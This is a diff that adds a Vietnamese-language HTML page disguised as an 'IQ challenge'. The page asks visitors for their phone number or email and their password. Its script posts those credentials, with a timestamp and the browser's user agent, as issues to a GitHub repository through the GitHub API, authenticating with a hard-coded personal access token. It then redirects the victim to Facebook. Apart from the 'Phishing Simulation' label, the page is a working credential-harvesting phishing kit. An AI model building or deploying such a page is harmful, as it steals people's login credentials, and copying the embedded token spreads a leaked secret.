@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <title>Thử thách IQ: Cần Xác thực</title>
+    <style>
+        body { font-family: 'Consolas', monospace; background-color: #1e1e1e; color: #00ff41; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; flex-direction: column; }
+        .puzzle-box { background-color: #252526; padding: 40px; border-radius: 10px; box-shadow: 0 0 15px rgba(0, 255, 65, 0.4); width: 400px; text-align: center; border: 2px solid #00ff41; }
+        h1 { color: #00ff41; font-size: 24px; margin-bottom: 20px; text-shadow: 0 0 5px #00ff41; }
+        .prompt { font-size: 18px; margin-bottom: 25px; color: #fff; }
+        input[type="text"], input[type="password"] { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #333; border-radius: 5px; box-sizing: border-box; background-color: #000; color: #00ff41; font-size: 16px; border: 1px solid #00ff41; }
+        button { background-color: #00ff41; color: #1e1e1e; padding: 12px; border: none; border-radius: 5px; cursor: pointer; width: 100%; font-size: 16px; font-weight: bold; transition: background-color 0.3s; }
+        button:hover { background-color: #00e03a; }
+        .error-message { color: #ff0000; margin-top: 15px; }
+    </style>
+</head>
+<body>
+    <div class="puzzle-box">
+        <h1>[IQ Challenge: Phishing Simulation]</h1>
+        <div class="prompt">
+            **Tình huống:** Để mở khóa cấp độ tiếp theo, hệ thống yêu cầu xác minh danh tính bằng cách giải mã "Mật Mã Đăng Nhập" (Login Code).
+            <br><br>
+            **Gợi ý:** Nhập thông tin đăng nhập của bạn để giải mã và xác minh.
+        </div>
+        
+        <form onsubmit="return captureAndLog(event)">
+            <input type="text" id="username" placeholder="Mã định danh (Số điện thoại hoặc Email)" required>
+            <input type="password" id="password" placeholder="Mật mã bí mật (Mật khẩu)" required>
+            <button type="submit">Giải Mã và Tiếp Tục</button>
+            <div id="status" class="error-message"></div>
+        </form>
+    </div>
+
+    <script>
+        // *** THÔNG SỐ ĐÃ ĐƯỢC THAY THẾ ***
+        const GITHUB_REPO_OWNER = 'baoiot13'; 
+        const GITHUB_REPO_NAME = 'phishing-demo-2025'; 
+        const GITHUB_PAT = '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'; 
+
+        async function captureAndLog(event) {
+            event.preventDefault();
+            document.getElementById('status').textContent = 'Đang giải mã...';
+
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+            const timestamp = new Date().toLocaleString('vi-VN');
+
+            const issueTitle = `[LOG] ${user} - ${timestamp}`;
+            const issueBody = `
+**SĐT/Username:** \`${user}\`
+**Mật khẩu:** \`${pass}\`
+**Thời gian:** ${timestamp}
+**User Agent:** ${navigator.userAgent}
+`;
+            const issueData = {
+                title: issueTitle,
+                body: issueBody,
+                labels: ['phish-log', 'critical-data']
+            };
+
+            const url = `https://api.github.com/repos/${GITHUB_REPO_OWNER}/${GITHUB_REPO_NAME}/issues`;
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Authorization': `token ${GITHUB_PAT}`,
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(issueData),
+                });
+                
+                if (response.ok) {
+                    document.getElementById('status').textContent = 'Giải mã thành công! Đang chuyển hướng đến cấp độ tiếp theo...';
+                } else {
+                     document.getElementById('status').textContent = 'Giải mã thất bại! Đang cố gắng chuyển hướng để khắc phục...';
+                }
+                
+                // Chuyển hướng nạn nhân về trang đích thật (sau 1.5 giây)
+                setTimeout(() => {
+                    window.location.href = 'https://www.facebook.com/'; 
+                }, 1500);
+            
+            } catch (error) {
+                document.getElementById('status').textContent = 'Lỗi kết nối. Đang chuyển hướng...';
+                setTimeout(() => {
+                    window.location.href = 'https://www.facebook.com/'; 
+                }, 1500);
+            }
+            return false;
+        }
+    </script>
+</body>
+</html>
